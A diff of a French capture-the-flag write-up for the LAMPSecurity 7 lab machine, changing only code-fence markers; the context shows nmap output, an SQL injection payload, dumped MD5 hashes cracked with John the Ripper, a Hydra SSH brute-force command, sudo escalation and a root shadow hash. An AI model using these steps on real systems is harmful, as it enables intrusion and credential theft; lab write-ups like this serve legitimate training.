@@ -11,7 +11,7 @@ Voici la solution [du CTF LAMPSecurity numéro 7](http://vulnhub.com/entry/lamps
 Frankie Goes to Pwnywood
 ------------------------
 
-```plain
+```
 Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-16 08:25 CEST
 Nmap scan report for 192.168.1.60
 Host is up (0.00018s latency).
@@ -74,7 +74,7 @@ En haut de la page il y a un formulaire *"Sign in"* avec les champs username et 
 
 La page retourne une erreur sql bavarde si on rentre **"'** comme nom d'utilisateur :  
 
-```plain
+```
 Invalid query: You have an error in your SQL syntax;
 check the manual that corresponds to your MySQL server version for the right syntax to use near ''" and password = md5("")' at line 1
 Whole query: select username, user_id from users where username = ""'" and password = md5("")
@@ -103,7 +103,7 @@ for i in range(0, 500):
 
 Le résultat obtenu est le suivant :  
 
-```plain
+```
 id = 3 brian@localhost.localdomain
 id = 4 john@localhost.localdomain
 id = 5 alice@localhost.localdomain
@@ -124,7 +124,7 @@ Et... oui ! si on rentre **" union select password, 0 from users where user\_id=
 
 Comme il y a peu d'utilisateurs on peut se permettre de faire une énumération manuelle. Après quelques temps on a les hashs suivants :  
 
-```plain
+```
 brian:e22f07b17f98e0d9d364584ced0e3c18
 john:0d9ff2a4396d6939f80ffe09b1280ee1
 alice:2146bf95e8929874fc63d54f50f1d2e3
@@ -141,7 +141,7 @@ test:098f6bcd4621d373cade4e832627b4f6
 
 Ça ne fait pas long feu avec une bonne wordlist :  
 
-```plain
+```
 $ /opt/jtr/john --wordlist=mega_dict.txt --format=raw-md5 hash.txt 
 Loaded 12 password hashes with no different salts (Raw MD5 [128/128 AVX intrinsics 12x])
 changeme         (foo)
@@ -157,7 +157,7 @@ guesses: 8  time: 0:00:00:02 DONE (Wed Jul 16 13:28:15 2014)
 
 Testons ces identifiants sur le serveur SSH. Ici pas question de les faire à la mano.  
 
-```plain
+```
 $ ./hydra -L users.txt -P passwords.txt -e nsr ssh://192.168.1.60
 Hydra v8.0 (c) 2014 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -181,7 +181,7 @@ La vie de Brian
 
 *Brian* a tous les droits et on le remercie :  
 
-```plain
+```
 [brian@localhost ~]$ sudo -l
 
 We trust you have received the usual lecture from the local System
@@ -206,7 +206,7 @@ root:$6$C85VH0UQ$ZFydP2qmc0DTBfK5x4UL9658RDdF/cAzRtRFv6SB7ctovLeEPV6BOzimsGtCQOY
 
 Au passage on trouve d'autres mots de passe dans le fichier *.mysql\_history* de root :  
 
-```plain
+```
 update users set password=md5('my2cents') where user_id = 3;
 update users set password=md5('transformersrule') where user_id = 4;
 update users set password=md5('turtles77') where user_id = 5;
